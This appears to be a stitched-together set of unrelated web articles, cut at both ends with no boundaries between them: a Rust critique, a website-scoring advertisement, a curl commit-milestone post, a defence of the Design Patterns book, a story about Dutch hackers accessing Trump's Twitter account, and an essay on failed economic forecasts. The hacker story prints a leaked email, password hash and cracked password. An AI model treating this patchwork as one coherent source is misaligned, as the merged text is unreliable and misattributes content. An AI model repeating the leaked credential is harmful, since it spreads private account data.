<p>Then there’s <strong>LLVM dependency.</strong> I understand that <code>LLVM</code> provides many advantages (like no need to worry about code generation for many platforms and optimising it) but it gives some disadvantages too. First, you don’t have a really self-hosting compiler (a theoretical problem but still a thing worth thinking about; also consider that you have to rely on a framework developed mostly by large corporations mostly in their own interests). Second, you’re limited by what it does e.g. I read complaints about debug builds being too slow mostly because of LLVM backend. And I suspect it still can’t do certain kinds of memory-related optimisations because it was designed with C++ compiler in mind which still has certain quirks regarding multiple memory access (plus IIRC there was one LLVM bug triggered by an infinite loop in Rust code that’s perfectly valid there but not according to C++ rules). I’m aware that <code>cranelift</code> exists (and Rust front-end for <code>GCC</code>) so hopefully this will be improved.</p>
<p>And finally there’s a thing related to the previous problem. Rust has poor <strong>support for assembly</strong>. Of course not so many people need standalone assembly and not inline one (which is still lacking but <code>asm!</code> is almost there) but languages oriented for systems programming support compiling assembly in addition to the higher-language code so it would be <em>proper</em> to support assembly files even with not so rich preprocessor syntax as GAS has. Fiddling with <code>build.rs</code> to invoke an external assembler is possible but not nice at all.</p>
<h3>Other Rust language problems</h3>
<p>There’s also one problem with Rust <code>std</code> library that I should mention too. It’s useless for interfacing OS. Now if I want to do something natural to any UNIX system I need to at least import <code>libc</code> crate <del datetime="2020-09-19T03:32:25+00:00">and link against an external libc</del> (it’s part of the runtime anyway). One solution would be that crate I heard of that wanted to translate <code>musl</code> into Rust so you can at least eliminate the linking step. But the proper solution would be to support at least OS-specific syscall() in <code>std</code> crate as many interesting libc functions are just a wrapper over it (like <code>open()</code>/<code>write()</code>/<code>ioctl()</code>; Windows is a different beast so I don’t mind if it’s <code>std::os::unix::syscall</code> and not something more common).</p>
<hr>
<p>I’m not a Rust language architect and I’m extremely unlikely to become one but I have an opinion on what Rust lacks in order to become a proper mature language really fit for systems development (three things essentially: being fully self-hosted, having a specification, and being able to interface low-level stuff without resorting to C compiler or assembler). Hopefully this will be rectified despite the lack of Mozilla.</p>

              <h4>Visual rank of your website is as important as your SEO rank.</h4>
              <p>Users make lasting judgments about a website’s appeal within a split second.  This first impression is influential enough to later affect their opinions of a site’s usability and trustworthiness.</p>

              <h4>What is Visual Mind ?</h4>
              <p>Visual Mind is an AI engine specifically designed for understanding and scoring visual appearance of a website. Visual Mind has analyzed over a million websites to achieve an accuracy rate of over 97%.</p>

              <h4>What is Visual Mind Score and why it matters ?</h4>
              <p>For too long, aesthetics of a website has been dismissed as a superficial concern. That is a mistake. As latest research demonstrates ( See recommended ref) , the visual appeal of a website is tied up with far weightier issues, such as functionality and trustworthiness.</p>
              <p>Have you “fast-tested” your website? Remember, you have only fifty milliseconds to impress your visitors. Flash your website to people for a very short period of time and then ask for their opinion. That is the opinion that matters.</p>
              <p>Visual Mind score – provides you with a qualitative score about that first impression. It can help you evaluate your website aesthetics and make improvements.</p>

<p>I’ve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl’s git repository</a> – and we don’t do merge commits so this number doesn’t include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can’t count</a> and shows a marginally lower number.</p>



<figure><img loading="lazy" width="844" height="116" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png 844w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-450x62.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-200x27.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-768x106.png 768w" sizes="(max-width: 844px) 100vw, 844px"></figure>



<p>This is of course a totally meaningless number and I’m only mentioning it here because it’s even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#daniel-vs-rest"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I’ve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of “curl time” per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren’t included in this commit number. For example, I have done over 4,400 commits in curl’s website repository.</p>



<p>With these my first 15,000 commits I’ve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to “modern times”, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I’ve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more “oops” commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>

<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>

<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl’s top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I’ve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won’t start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I’m present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There’s a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>

<p>I showed these results to my wife. She approved.</p>

<h3>
  18 September 2020
</h3>


  <p>In a few months, I’ll celebrate my fifth year as a professional - understand paid - software engineer. I find this role to be a right balance of technical skills, human relationships and it fulfils my curiosity. As time goes by, I’m also starting to be disappointed by some of its negative aspects. While it doesn’t prevent me from sleeping, I think an effort could be made to challenge some lousy and short-sighted comments we see daily on social platforms.</p>
<p>Today, I’d like to talk about <a href="https://www.amazon.com/Design-Patterns-Object-Oriented-Addison-Wesley-Professional-ebook/dp/B000SEIBB8">Design Patterns: Elements of Reusable Object-Oriented Software</a>, a book written by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides, famously known as the <em>Gang of Four</em>. If you never read it: this is a fundamental programming book describing programming abstractions published in 1994. The date is essential here, but we’ll come to that later.</p>
<p>This book has recently been discussed by many, due to <a href="https://twitter.com/unclebobmartin/status/1306581616983183361">a recent tweet from Robert. C. Martin aka Uncle Bob</a>. Long story short, telling a massive audience that book X is great, and treating people who consider it outdated as “foolish” does not end well.</p>
<p>While I disagree with the tone here, I’d like to focus on the negative comments which followed, including but not limited to:</p>
<ul>
<li>the book is outdated</li>
<li>its concepts are outdated</li>
<li>its authors said it’s outdated</li>
<li>the book is only focused on mid-90s C++ developers</li>
<li>no one ever used the “flyweight” design pattern</li>
<li>the book is not even readable</li>
<li>its abstractions make code unreadable</li>
</ul>
<p>First of all, let’s get back to 1994. I was two at the time. All Internet websites could probably fit on a floppy disk, Jeff Bezos founded Amazon, Rasmus Lerdorf was only starting to work on its <em>Personal Home Page/Forms Interpreter</em> CGI C program, and Larry Page and Sergey Brin would only start their research project for a web search engine two years later. The biggest technology companies were IBM, Hewlett-Packard, Motorola and Xerox, which mostly sat behind the oil, car, and food industries. Programming existed, but it wasn’t the same field as we know it today. Tech companies were a few, and I assume a lot of programmers were working in other industries. Being a professional in this sector was arguably more difficult then, and knowledge was not as easily accessible as it is today. This book was published in a world where programming started to spread in many industries. It surely was a very good resource, to try to apply its concepts, and see what works and what doesn’t. The authors were literally inventing the field at the time: Erich Gamma, for instance, teamed up with Kent Beck to create the Java JUnit test framework just a few years later, which hugely helped to popularise testing.</p>
<p>My point is: let’s remind ourselves we stand on the shoulders of many people who tried and experimented a lot at the time. We too often take for granted the knowledge and productivity we have today. On top of that, let’s not be disrespectful towards the previous generation. My father and my grandfather both work(ed) as electricians: never did my father complain about his father’s tools or habits before him. He learned them and perfected them with modern knowledge.</p>
<p>Now about the book in itself. While I agree with people saying that some design patterns are too abstract, I strongly disagree with the ones saying the whole book is outdated. Should you develop in a OO language today, such as Java, C++, Python or Ruby, or even more notably, develop a framework or a tool <em>for</em> developers, I think this book is still highly relevant today.</p>
<p>Here are my top picks from the book and why I chose them.</p>
<p><strong>Builder:</strong> because in OOP, objects often hold too much data in them, you need to control how to instantiate them properly. Even with overloaded constructors, data validation at instantiation can become messy. Do you like your testing framework using a <em>fluent interface</em> with method chaining (<code>assert(...).not().equalTo(...)</code>)? Guess what, it’s directly inspired by the builder design pattern.</p>
<p><strong>Prototype:</strong> I often hear people complaining about how complicated JavaScript is. While I don’t think this language makes it easy for the developer to write non error-prone code, I better understood the language via the lens of its prototype-based nature, precisely described by the prototype design pattern.</p>
<p><strong>Most of the structural patterns:</strong> While everyone is focused on the bad parts of OOP, namely inheritance, all those design patterns are focused on composability. If you want to be cool nowadays, you could say you prefer “composition over inheritance”. Well, if you think composition is only about embedding objects in each other, you should read the part of structural design patterns. For instance, you probably know decorators from Python or annotations in Java/C#, they derive from the decorator design pattern.</p>
<p><strong>Chain of Responsibility:</strong> I think we can all agree on how great it is to use and implement a middleware in our modern web framework. Just use or write functions which take a <em>next</em> handler, a request object. Pass it to your web framework instance via a <code>.use(...)</code> method and you’re done. This is what the Chain of Responsibility pattern is all about. All Rails, Django, and Laravel developers knew that was NIH.</p>
<p><strong>Iterator:</strong> This one seems obvious now, perhaps not so much at a time where iterating on arrays with pointer arithmetic was common. Today, iterators are even buried behind standard libraries to implement even higher abstract functionalities, but they are still there. I don’t see a more universal way to implement, with the same public API, a traversal of an array, a tree, or a graph (they are better ways of iterating those last data structures though).</p>
<p><strong>Observer:</strong> For this last one, here is the verbatim definition from the book: “Define a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically”. Now, if we take a look at some modern technologies, doesn’t this resonate with PubSub models or React hooks for instance?</p>
<p>To conclude, I’m not saying the book is not old, quite the opposite: you can feel it when it takes as examples from 90s user interfaces. I’m merely advocating that our industry and its workers have changed a lot in the last 30 years, dare I say even more than in any other industry. But this should not be an excuse to sweep away years of meticulous R&amp;D and documentation, on which our modern tools still rely on nowadays, and the people behind it.</p>
<p>Because a lot of people complained that they were never able to finish the book, here is an extract from the end, section “What to Expect from Design Patterns”, page 351:</p>
<blockquote>
<p>It’s possible to argue that this book hasn’t accomplished much. After all, it doesn’t present any algorithms or programming techniques that haven’t been used before. […] it just documents existing designs. You could conclude that it makes a reasonable tutorial, perhaps, but it certainly can’t offer much to an experienced object-oriented designer.</p>
<p>We hope you think differently. Cataloging design patterns is important. It gives us standard names and definitions for the techniques we use. If we don’t study design patterns in software, we won’t be able to improve them, and it’ll be harder to come up with new ones.</p>
<p>This book is only a start.</p>
</blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>In 2016, three Dutch hackers &nbsp;got hold of Donald Trump’s Twitter password. It wasn’t the launch codes of a nuclear missile, but it came pretty close: one tweet could jeopardize world peace, or prevent Trump from becoming president. How does one handle this amount of responsibility?</p><section id="article-body" data-article-content-element="" data-article-uid="480201" data-restricted="false"><div data-article-content-target=""><p>On October 27, 2016 three middle-aged men were gathered in a room in Hotel Cathedral in the center of Ghent. All three typing away on a laptop.<br> “Uh oh”, one of them said.</p><p>A Twitter login screen displayed the Twitter handle @realdonaldtrump alongside a few password dots. Twitter also asked for an email address verification. ‘Donaldtrump@trump.com’ didn’t work, an error message appeared. And the login attempt failed. Remarkably, in a way that had not been foreseen. The email address was incorrect, the password however, matched!<br> “Did you use a VPN?”<br> “No. I didn’t think the password would work”.</p><blockquote><p>Was this a cyber-attack on an American presidential candidate?</p></blockquote><p>All three of them realized what this meant. The login attempt had been made using the hotel’s Wi-Fi. The Twitter log files now showed that there had been an attempt to log in on the account, from their hotel, using Donald Trump’s legitimate password. And these logfiles would undoubtedly be transferred to the U.S. intelligence services.</p><p>It could be perceived as a cyber-attack on an American presidential candidate.</p><p>Something that could get them into trouble and ruin their reputation, something they could not afford to let happen.</p><h5>Grumpy old hackers</h5><p>I first met with Edwin, Mattijs and Victor in June, in Amsterdam-Noord. “Up the stairs, first door on the left”. I enter a James-Bond-like setting, a room with high windows and a view of the IJ river, a dock with a drilling tower and a Russian polar ship. The three men are sitting at a large conference table. On the table, a few bottles of Club-Mate, the hacker’s preferred beverage.</p><p>It is immediately noticeable that the three of them are close. They have some resemblance to members of a rock band. Victor the talkative guitarist, Mattijs the thoughtful bass player and Edwin the grumpy drummer, who occasionally intervenes when the conversation tends to stray. All three are members of the GGOH – <em>The Guild of Grumpy Old Hackers</em>. Their <a href="http://ggoh.info/">website</a> displays an image with eight pirates and a bitcoin address. “No one has ever transferred a single bitcoin to us, though”.</p><p>The GGOH has about ten members: ‘Elite’ older hackers. Everyone has their own specialism. They do things the police or the army won’t or can’t do. They carry information they can’t ever share. They have decent day time jobs. Large corporates hire Edwin and Mattijs to help them with their information security. Victor is employed by a government agency. At night, however – they run ‘projects’. They love algorithms and the law, because where there are rules, mistakes happen. “Loopholes. Forgotten things.” says Edwin, “Such as the fact that churches have access to the municipal personal records database. Somewhat weird. The kind of thing that will trigger us to start a church of our own.”</p><blockquote><p>“Yes, the three of us could immobilize the country. And so could you. By yourself.”</p></blockquote><p>They aim to locate these mistakes before criminals, spies and terrorists do. And while doing so, they come across the craziest things. Such as bridges that can be opened via the internet, telescopic traffic bollards that can rise from the pavement using a laptop and pension funds that can be accessed with very limited difficulty. They are very careful to not mention specific examples. Mainly because of signed confidentiality agreements with clients. But also to not give others any ideas. “Yes, the three of us can immobilize the country”, says Mattijs, “but so can you, by yourself”.</p><p>In order to securely exchange information with colleagues working in information security, they attend hacker conferences such as BlackHat and DEF CON in Las Vegas, BruCON in Ghent and the Chaos Communication Congress in Leipzig, where I first heard about their story. “Dutch hackers hacked Trump’s Twitter account just before the 2016 elections”, someone there said.</p><p>Within a small bubble of the hacker community it was known who they were. And after a few months of strong persistence, the grumpy hackers agreed to speak with me. I was allowed to write up this story, on the sole condition that I would only mention their first names.</p><h5>Digital treasure trove</h5><p>In October 2016, the grumpy hackers attended another hacker conference. One they never miss: BruCON, held in the Aula Academica in Ghent, a nineteenth-century neoclassical building with Corinthian columns and a small lecture hall in the shape of an arena.</p><p>“We normally sit center downstairs, a little towards the back”, says Victor, “We do that mostly for me. I don’t like any hustle and bustle around me, and I also like to keep a little oversight. We listen to the talks and dig around on our machines a little bit in the meantime. But this time we were on the second floor, very high up. On very unpleasant wooden benches. And then there was a talk from someone I personally like very much, but the presentation contained incredibly annoying sheep sounds. Really. Every single slide: mèèh. So then Edwin said, ‘Yo that stolen LinkedIn data file has now been made publicly available’. That’s pretty cool, let’s go check it out”.</p><p>And so, accompanied by sheep chatter, the grumpy old hackers left the auditorium to go take a look at the LinkedIn file.</p><p>Everyone in information security had heard about ‘that LinkedIn database’. A digital treasure trove with 120 million usernames and hashes of passwords (see insert below to this piece). The loot of a digital burglary in 2012. The mastermind was Yevgeni Nikulin. Google his name and you will find his picture near a Lamborghini parked in front of the Basilius Cathedral on the Red Square in Moscow.</p><p>According to the lawsuit documentation now pending against him in the United States, he managed to get LinkedIn employees to click a link in an email and infected their computers with malware. Through these computers Nikulin managed to gain access to the internal LinkedIn network.</p><h5>Dark market</h5><p>Nikulin made a ton of money selling information to people in a secret criminal network. It is no coincidence that shortly after the LinkedIn break-in, Donald Trump’s Twitter account was hacked. On 21 February 2013, song lyrics by rapper Lil’ Wayne appeared on Trump’s Twitter account. Trump, who had ‘only’ two million followers at the time, reacted immediately:</p><p>‘My Twitter has been seriously hacked – and we are looking for the perpetrators’.</p><p>It wasn’t until the summer of 2016 that the LinkedIn file popped up on the black market. For 5 bitcoins – at that time the equivalent of about three thousand euros – it was offered on The RealDeal, a well-known dark market. This seemed very appealing to the grumpy old hackers.</p><p>“When you are responsible for the information security of a large company or a government agency, you will want access to such a database to see if it contains data of people from your own organization. Three thousand euros isn’t much for a database like this. If you only knew how many intelligence services would be willing to pay for this”, says Victor. “However, buying stolen data is a criminal offense. It is illegal, and we wouldn’t ever consider doing that. We’re not keen on financially aiding criminals. Also, the police access the dark markets too. They can identify buyers. It was absolutely out of the question for us to acquire that file”.</p><blockquote><p>Mark Rutte was on that list. So was Mark Zuckerberg.</p></blockquote><p>Security researchers who infiltrated criminal networks got their hands on the database, regardless. Within the information security community, these types of files are shared in order to better test one’s own security. Something that is impossible to do out in the open.</p><p>Edwin was the first to receive a link, which he immediately shared with Mattijs and Victor. They quickly left for the hotel to quietly conduct further research.</p><p>“I instantly found my director’s password in there”, says Victor, “I sent him a brief message, saying ‘look, it’s your password”. Dutch Prime Minister Mark Rutte was on the list. And so was Mark Zuckerberg (‘dadada’ – turned out afterwards that the password for his facebook account was ‘tadada’).</p><h5>‘Ethical hackers’</h5><p>A week and a half prior to the US elections, everyone in the information security domain was talking about Trump’s Twitter account. It was the most wanted target in the world. From hacktivists to foreign intelligence agencies, they were all out for that account. It was therefore very instinctive to check if Donald Trump was also in the database.</p><p>And he was, right there.<br> email: donaldtrump@trump.com<br> password hash: 07b8938319c267dcdb501665220204bbde87bf1d</p><p>Using the program John the Ripper – a tool hackers use to crack hashes – Mattijs identified the password in less than a second: yourefired</p><p>Edwin was typing it in before anyone could say anything.<br> The password was accepted, and as an extra verification step an email address had to be entered.<br> But the entered address was incorrect.</p><p>Edwin almost fell off his chair. It meant that Trump hadn’t changed his password after the 2013 ‘hack’.<br> Which was bad news.</p><blockquote><p>There was no time to waste. If anyone else would now hack Donald Trump’s Twitter account, they were the ones to be potentially blamed.</p></blockquote><p>The grumpy old hackers knew better than anyone that the Twitter administrators would be able to see that they had made a login attempt from their hotel with the correct Donald Trump password. And also that this information would sooner or later be passed on to the U.S. intelligence services. A login attempt on Donald Trump’s Twitter account could be perceived as a cyber-attack on a U.S. presidential candidate.</p><p>So there really was only one option. The grumpy hackers would have to prove that they were real ‘ethical hackers’. In order to demonstrate this in an unambiguous way, however – they would have to, ironically, break into Trump’s account. It would be the …</p></div></section></div>

In the PowerPoint projections of self-proclaimed prophets. In the feeds of forecasters and futurists.&nbsp;They crop up on every conference stage. They make their mark on every marketing magazine. And they work their way into every white paper.</p><p>To understand the extent of our forecasting fascination, I analysed the websites of three management consultancies looking for predictions with time frames ranging from 2025 to 2050. Whilst one prediction may be published multiple times, the size of the numbers still shocked me.&nbsp;Deloitte’s site makes 6904&nbsp;predictions.&nbsp;McKinsey &amp; Company make 4296. And Boston Consulting Group, 3679.</p><p>In total, these three&nbsp;companies’ websites include just shy of 15,000 predictions stretching out over the next 30 years.</p><p>But it doesn’t stop there.</p><p>My analysis finished in the year 2050 not because the predictions came to an end but because my enthusiasm did.</p><p>Search the sites and you’ll find forecasts stretching all the way to the year 2100. We’re still finding our feet in this century but some, it seems, already understand the next.</p><p>I believe the vast majority of these to be not forecasts but fantasies. Snake oil dressed up as science. Fiction masquerading as fact.</p><p>This article assesses how predictions have performed in five fields. It argues that poor projections have propagated throughout our society and proliferated throughout our industry. It argues that our fixation with forecasts is fundamentally flawed.</p><p>So instead of focussing on the future, let’s take a moment to look at the predictions of the past.&nbsp;Let’s see how our projections panned out.</p><h3>We can’t predict recessions</h3><p>The Economist’s “The World in 2020”, published in late 2019, brings together experts from business, politics and science to fill 150 pages with projections for the year ahead.</p><p>Editor Daniel Franklin&nbsp;<a href="https://theworldin.economist.com/edition/2020/article/17308/world-2020"><span>summarised</span></a>&nbsp;the issue’s predictions on 2020’s economic outlook:&nbsp;</p><blockquote><p>“Banks, especially in Europe, will battle with negative interest rates. America will flirt with recession—but don’t be surprised if disaster fails to strike, and markets revive.”</p></blockquote><p>Just over two months later COVID-19 struck, the world went into lockdown and we fell into one of the largest&nbsp;<a href="https://news.sky.com/story/coronavirus-largest-uk-recession-on-record-official-figures-12047521"><span>recessions</span></a>&nbsp;on record.</p><p>Perhaps this critique is unfair. The Economist wasn’t to know that we were on the precipice of a pandemic.&nbsp;So let’s review our success rate during more stable times.</p><p>Over to the&nbsp;<a href="https://www.ft.com/content/70a2a978-adac-11e7-8076-0a4bdda92ca2"><span>Financial Times</span></a>:</p><blockquote><p>&nbsp;“In the 2001 issue of the International Journal of Forecasting, an economist from the International Monetary Fund, Prakash Loungani, published a survey of the accuracy of economic forecasts throughout the 1990s. He reached two conclusions. The first was that forecasts are all much the same. There was little to choose between those produced by the IMF and the World Bank, and those from private sector forecasters. The second conclusion was that the predictive record of economists was terrible. Loungani wrote: “The record of failure to predict recessions is virtually unblemished.””</p></blockquote><p>It’s hard to overstate the severity of Loungani’s findings. His&nbsp;<a href="https://www.theguardian.com/money/2017/sep/02/economic-forecasting-flawed-science-data"><span>analysis</span></a>&nbsp;revealed that economists had failed to predict 148 of the past 150 recessions. To put it another way, the experts only saw 1.33% of recessions coming.</p><p>Others have pushed their analysis even further.</p><p>Andrew Brigden, Chief Economist at Fathom Consulting,&nbsp;<a href="https://www.bloomberg.com/news/articles/2019-03-28/economists-are-actually-terrible-at-forecasting-recessions"><span>analysed</span></a>&nbsp;the International Monetary Fund’s predictions across 30 years and 194 countries. The research found that only 4 of the 469 downturns had been predicted by the spring of the preceding year. Brigden’s success rate of 0.85% is remarkably consistent with Longani’s.&nbsp;<a href="https://www.fathom-consulting.com/the-economist-who-cried-wolf/"><span>Brigden</span></a>&nbsp;writes:</p><blockquote><p>“Since 1988, the IMF has never forecast a developed economy recession with a lead of anything more than a few months.”</p></blockquote><p>These two studies, and countless others, paint a pretty damning picture of our ability to spot recessions on the horizon.&nbsp;</p><p>It’s clear that our&nbsp;track record of predicting&nbsp;recessions is pretty patchy. But that doesn’t stop us from making more. As a slowdown turns into a downturn, economists rush to reassure by predicting when more stable times will return. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict GDP</h3><p>On 15&nbsp;September 2008 Lehman Brothers filed for bankruptcy.</p><p>Despite being the largest bankruptcy filing in U.S.&nbsp;history, the&nbsp;government refused to bail out the bank. Global financial stress quickly turned into an international emergency.</p><p>From its New York epicentre,&nbsp;the effects rippled around the world. International trade fell off a cliff. So did industrial production. Unemployment soared and consumer confidence collapsed.</p><p>7 months&nbsp;later, on 22 April 2009, the IMF&nbsp;published its&nbsp;<a href="https://www.imf.org/en/Publications/WEO/Issues/2016/12/31/World-Economic-Outlook-April-2009-Crisis-and-Recovery-22575"><span>World Economic Outlook</span></a>:</p><blockquote><p>“Even with determined steps to return the financial sector to health and continued use of macroeconomic policy levers to support aggregate demand, global activity is projected to contract by 1.3% in 2009. (…) Growth is projected to reemerge in 2010, but at 1.9% it would be sluggish relative to past recoveries.”</p></blockquote><p>These figures did not fare well.</p><p>Global GDP did contract in 2009 but by 0.7%, around half as severe as the forecast. In 2010, growth wasn’t sluggish but soaring. The global economy grew by a whopping 5.1%, two and a half times greater than the 1.9% predicted.&nbsp;</p><p>In an analysis of the IMF predictions by&nbsp;<a href="https://www.brookings.edu/blog/future-development/2020/04/14/the-world-economy-in-2020-the-imf-gets-it-mostly-right/"><span>The Brookings Institute</span></a>, the critique went even further:</p><blockquote><p>“(The IMF) got the numbers for China and India wrong. The numbers for 2010 were way off-target: The U.S. economy ended up growing by 3% instead of the forecasted zero, Germany’s economy by 3.5% instead of shrinking by one and Japan by 4% instead of -0.5%.”</p></blockquote><p>But it isn’t just the IMF. Take The World Bank.</p><p>On 1 January 2010, The&nbsp;World Bank published their&nbsp;<a href="http://documents.worldbank.org/curated/en/115101468337160604/Global-economic-prospects-2010-crisis-finance-and-growth"><span>Global Economic Prospects</span></a>&nbsp;report. With 9 months longer than the IMF, you’d expect their GDP predictions to be much more accurate. But they still missed the mark.</p><p>They predicted global GDP to grow 2.7% but in reality it increased 3.8%. 1.1% out. In China and&nbsp;India, they&nbsp;were 1.3% out. And in Japan they were 2.7% wide of the mark.</p><p>Clearly our GDP predictions are imprecise and imperfect. But that doesn’t stop us from making more. As society starts to stabilise, economists turn their attention to predicting more universal measures. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict interest rates</h3><p>On&nbsp;14 July 2015, two&nbsp;economics professors,&nbsp;Maurice Obstfeld and Linda Tesar, published an article on the&nbsp;<a href="https://obamawhitehouse.archives.gov/blog/2015/07/14/decline-long-term-interest-rates"><span>White House website</span></a>&nbsp;espousing the importance of interest rates:</p><blockquote><p>“The level of long-term interest rates is of central importance in the macroeconomy. It matters to borrowers looking to start a business or buy a home; lenders evaluating the risk and rewards of extending credit; savers preparing for college or retirement; and policymakers crafting the government’s budget.”</p></blockquote><p>With interest rates being so important to so many, it’s no surprise that an entire industry of professional predictors exists to monitor the rate’s past and forecast its future.</p><p><a href="https://www.wsj.com/articles/some-investors-had-hunch-yields-were-about-to-fall-11560072600"><span>The Wall Street Journal</span></a>&nbsp;surveyed a panel of 50 such specialists and asked them to predict the interest rate 8 months into the future.</p><p>From a starting interest rate of 3.2%, the professional&nbsp;predictions ranged from a high of 3.8% to a low of 2.5%. The average estimate was 3.4%.</p><p>In reality, nobody came close. 6 months in and the interest rate had fallen below the predictions’ lower bound. And it kept falling. By the end of the prediction timeframe the rate was closing in on 2%. None of the predictions had come within half a percent of reality.&nbsp;</p><p>These may seem like fine margins, but half a percent represents about a sixth of the initial rate. That’s like having 50 estate agents estimating the value of a $1.2m property and nobody coming within $200,000.</p><p>And this isn’t a one off.</p><p>The Obstfeld and Tesar article&nbsp;presents the results of similar studies conducted in&nbsp;five different years.</p><p>In every single one, the&nbsp;forecasts fail. In 2006, the rate was predicted to be 6%, in reality it was closer to 5%. In 2010, it was predicted to be 6%, it was actually closer to 4%. In 2005, it was predicted to be 5%, it was closer to 2%.</p><p>The article concludes:</p><blockquote><p>“The decline (in interest rates) has come largely as a surprise. Financial markets and professional forecasters alike consistently failed to predict the secular shift, focusing too much on cyclical factors.”</p></blockquote><p>It seems that interest rate predictions are prone to flounder and fold. But that doesn’t stop us from making more. Despite our failures at forecasting one economy, some turn their attention to predicting the relationship between two. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict exchange rates</h3><p>If predicting the ups and downs of one economy is hard, forecasting the relationship between two is doubly difficult.</p><p>Fortunately, financial institutions&nbsp;make an assessment of their success straight forward.</p><p>At the start of each year, many banks make a prediction for the end of year dollar-to-euro exchange-rate. In one study, Gerd Gigerenzer, the director emeritus of the Center for Adaptive Behavior and Cognition&nbsp;at the Max Planck Institute for Human Development, compiled the exchange rate predictions made between 2000 and 2010 by 22 international banks including Barclays, Citigroup, JPMorgan&nbsp;Chase, and the Bank of&nbsp;America Merrill Lynch.</p><p>Discussing the Gigerenzer study in his book&nbsp;<a href="https://www.amazon.co.uk/dp/1509843493/ref=cm_sw_r_cp_api_i_H6r5EbR6BYQMC"><span>Range</span></a>&nbsp;David Epstein provides some searing details into where the forecasts went wrong:</p><blockquote><p>“In six of the ten years, the true exchange rate fell outside the entire 